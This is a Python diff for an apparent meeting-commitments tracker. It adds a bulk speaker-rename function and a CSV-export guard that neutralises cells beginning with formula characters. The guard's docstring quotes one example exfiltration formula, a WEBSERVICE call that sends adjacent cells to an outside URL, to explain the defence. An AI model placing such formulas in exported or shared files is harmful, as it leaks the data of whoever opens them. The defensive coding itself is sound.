@@ -965,6 +965,30 @@ def rename_person(meeting_id: int, old: str, new: str) -> int:
     return n
 
 
+def rename_people(meeting_id: int, changes: Dict[str, str]) -> int:
+    """Several speakers of a recording renamed at once (split anew: «Участник 2» is «Участник 3» now and
+    «Участник 3» is «Участник 2»): each task takes the new name of its person, read before any is changed."""
+    keyed = {(o or "").strip().casefold(): (n or "").strip() for o, n in (changes or {}).items()
+             if (o or "").strip() and (n or "").strip() and (o or "").strip() != (n or "").strip()}
+    if not keyed:
+        return 0
+    _init()
+    with _db_lock:
+        conn = get_connection()
+        try:
+            n = 0
+            for r in conn.execute("SELECT id, who, to_whom FROM commitments WHERE meeting_id = ?", (meeting_id,)).fetchall():
+                who = keyed.get((r["who"] or "").strip().casefold(), r["who"])
+                to = keyed.get((r["to_whom"] or "").strip().casefold(), r["to_whom"])
+                if (who, to) != (r["who"], r["to_whom"]):
+                    conn.execute("UPDATE commitments SET who = ?, to_whom = ? WHERE id = ?", (who, to, r["id"]))
+                    n += 1
+            conn.commit()
+        finally:
+            conn.close()
+    return n
+
+
 def set_status(commitment_id: int, status: str) -> None:
     if status not in ("open", "done"):
         raise ValueError("Неизвестное состояние")
@@ -1052,7 +1076,15 @@ def export_text(items: List[Dict[str, Any]], fmt: str, lang: str = "ru") -> str:
                     "Срок" if lang == "ru" else "Due", "Встреча" if lang == "ru" else "Meeting",
                     "Дата" if lang == "ru" else "Date", "Выполнено" if lang == "ru" else "Done"])
         for x in items:
-            w.writerow([x["what"], x["who"], x.get("to_whom") or "", x.get("due") or "", x.get("meeting_title", ""),
-                        x.get("meeting_date", ""), "да" if x.get("status") == "done" and lang == "ru" else
-                        "yes" if x.get("status") == "done" else ""])
+            w.writerow([_cell(x["what"]), _cell(x["who"]), _cell(x.get("to_whom") or ""), x.get("due") or "",
+                        _cell(x.get("meeting_title", "")), x.get("meeting_date", ""),
+                        "да" if x.get("status") == "done" and lang == "ru" else "yes" if x.get("status") == "done" else ""])
     return buf.getvalue()
+
+
+def _cell(value: Any) -> str:
+    """A text cell of the table that Excel shows as text: a task said in a meeting or the title of an
+    invitation (written by whoever sent it) starting with = + - @ would be run as a formula when the file is
+    opened (=WEBSERVICE("http://…"&A2) sends the neighbouring cells away)."""
+    text = str(value or "")
+    return "'" + text if text[:1] in ("=", "+", "-", "@", "\t", "\r") else text
